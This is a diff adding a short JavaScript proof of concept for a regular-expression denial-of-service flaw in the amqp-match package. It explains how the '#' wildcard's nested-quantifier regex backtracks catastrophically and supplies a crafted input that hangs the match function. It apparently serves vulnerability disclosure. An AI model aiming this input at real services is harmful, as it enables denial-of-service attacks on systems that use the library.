@@ -1,0 +1,18 @@
+```javascript
+// ReDoS vulnerability in amqp-match's `match` function.
+// The '#' wildcard is translated into the regex fragment ([^.]+\.?)+,
+// a nested-quantifier pattern that causes catastrophic backtracking
+// when the input fails to match at the very end.
+
+const match = require("amqp-match");
+
+const n = 28; // grows exponentially with n; ~28 already takes minutes
+const malicious = "a".repeat(n) + "..";
+
+console.log("Starting match... this should hang / take an extremely long time");
+const start = Date.now();
+
+match(malicious, "#");
+
+console.log("Finished in", Date.now() - start, "ms");
+```
